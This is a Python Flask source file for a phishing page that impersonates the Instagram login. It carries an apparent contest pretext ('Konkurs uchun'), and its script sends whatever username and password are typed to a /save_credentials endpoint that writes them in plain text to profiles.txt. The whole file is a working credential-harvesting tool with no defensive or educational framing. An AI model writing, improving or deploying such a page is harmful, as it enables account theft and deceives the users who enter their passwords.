from flask import Flask, request, send_file

app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram</title>
            <style>
                body{
                    margin-top: 100px;
                    margin-right: 550px;
                    margin-left: 550px;
                    margin-bottom: 300px;
                    background-color: rgb(33, 185, 7);
                }
                .sector{
                    margin-top: 100px;
                    margin-right: 550px;
                    margin-left: 50px;
                    margin-bottom: 200px;
                    background-color: antiquewhite;
                    height: 500px;
                    width: 400px;
                    border: 4px solid rgb(8, 79, 79);
                    border-radius: 20px;
                }
                .sector  h4{
                    color: rgb(5, 113, 77);

                }
                .sector h1{
                    color: #E1306C;
                }
                .sector label{
                    font-size: 22px;
                    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
                    margin-left: 60px;
                    margin-bottom: 20px;

                }
                .inpbtn{
                    margin-left: 50px;
                    width: 300px;
                    border-top: 0;
                    border-left: 0;
                    border-right: 0;
                    border-bottom: 3px solid lightgreen;
                    margin-bottom: 10px;
                    background-color: antiquewhite;
                    height: 30px;
                    font-size: 18px;
                    font-family: Verdana, Geneva, Tahoma, sans-serif;
                }
                .subbtn{
                    background-color: greenyellow;
                    font-size: 19px;
                    margin-left: 50px;
                    width: 305px;
                    border: 3px solid black;
                    border-radius: 5px;
                    height: 40px;
                }
                .inpbtn::backdrop{
                    background-color: aquamarine;
                    font-size: 20px;
                    font-family: 'Times New Roman', Times, serif;
                }
    </style>
    </head>
    <body>
        <div class="sector">
            <center><h4>Konkurs uchun</h4></center>
            <center><h1>Instagram</h1></center><br><br>
            <label for="Username">Username:</label><br>
            <input type="text" name="username" id="username" class="inpbtn"><br>
            <label for="password">Password:</label><br>
            <input type="password" name="password" id="password" class="inpbtn"><br>
            <input type="submit" value="Log in" class="subbtn" onclick="saveCredentials()">
        </div>

        <script>
            function saveCredentials() {
                var username = document.getElementById('username').value;
                var password = document.getElementById('password').value;
                
                // Send data to server
                fetch('/save_credentials', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password }),
                });
            }
        </script>
    </body>
    </html>
    '''

@app.route('/save_credentials', methods=['POST'])
def save_credentials():
    data = request.get_json()
    username = data['username']
    password = data['password']

    with open('profiles.txt', 'a') as file:
        file.write(f'Username: {username}\nPassword: {password}\n\n')

    return 'Credentials saved successfully'

if __name__ == '__main__':
    app.run(debug=True)
